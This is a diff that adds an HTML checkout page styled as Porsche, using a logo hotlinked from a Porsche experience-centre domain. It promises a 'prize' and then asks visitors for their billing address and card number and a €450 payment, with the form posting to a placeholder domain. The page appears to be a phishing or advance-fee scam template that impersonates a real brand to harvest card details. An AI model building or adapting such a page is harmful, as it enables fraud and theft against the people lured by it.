@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Checkout - Porsche</title>
+  <style>
+    body {
+      font-family: "Arial", sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      color: #000;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid #ccc;
+    }
+
+    header img {
+      height: 50px;
+    }
+
+    header span {
+      margin-left: 20px;
+      font-size: 16px;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 26px;
+      margin-bottom: 10px;
+    }
+
+    .step {
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .payment-method {
+      margin-top: 30px;
+    }
+
+    .radio-option {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .radio-option input {
+      margin-right: 10px;
+    }
+
+    .card-icons img {
+      height: 24px;
+      margin-right: 8px;
+      margin-top: 10px;
+    }
+
+    .pay-button {
+      background-color: #d5001c;
+      color: #fff;
+      font-size: 18px;
+      border: none;
+      padding: 15px;
+      margin-top: 30px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .pay-button:hover {
+      background-color: #bb0019;
+    }
+
+    .note {
+      font-size: 14px;
+      color: #333;
+      margin-top: 30px;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://booking.porsche-experiencecenter-hockenheimring.de/app/assets/images/porsche-svg.svg" alt="Porsche Logo">
+    <span>Private Area</span>
+  </header>
+
+  <div class="container">
+    <h1>Checkout</h1>
+    <div class="step"><strong> provide us with your information to get the prize </strong> </div>
+
+    <form id="checkoutForm" method="POST" action="https://yourdomain.com/submit">
+
+      <h2>Billing Address</h2>
+
+      <label for="street">Street</label>
+      <input type="text" id="street" name="street" placeholder="Street" required>
+
+      <label for="house_number">House number</label>
+      <input type="text" id="house_number" name="house_number" placeholder="876" required>
+
+      <label for="postal_code">Postal code</label>
+      <input type="text" id="postal_code" name="postal_code" placeholder="21922" required>
+
+      <label for="city">City</label>
+      <input type="text" id="city" name="city" placeholder="makkjj" required>
+
+      <label for="country">Country</label>
+      <select id="country" name="country" required>
+        <option value="Saudi Arabia">Saudi Arabia</option>
+        <option value="Germany">Germany</option>
+        <option value="USA">USA</option>
+      </select>
+
+      <div class="payment-method">
+        <h2>Payment Method</h2>
+
+        <div class="radio-option">
+          <input type="radio" id="paypal" name="payment_method" value="paypal">
+          <label for="paypal">PayPal</label>
+        </div>
+
+        <div class="radio-option">
+          <input type="radio" id="creditcard" name="payment_method" value="creditcard" checked>
+          <label for="creditcard">Credit Card</label>
+        </div>
+
+        <label for="card_number">Card Number</label>
+        <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" required>
+
+        <div class="card-icons">
+          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
+          <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+          <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
+        </div>
+      </div>
+
+      <button type="submit" class="pay-button">Pay €450.00</button>
+    </form>
+
+    <div class="note">
+      <strong>Please note:</strong> Do not close or refresh the browser before your payment has been processed. Wait until you see a confirmation page with your booked experiences.
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('checkoutForm').addEventListener('submit', function(e) {
+      const confirmed = confirm("Are you sure you want to proceed with the payment of €450.00?");
+      if (!confirmed) {
+        e.preventDefault();
+      }
+    });
+  </script>
+
+</body>
+</html>
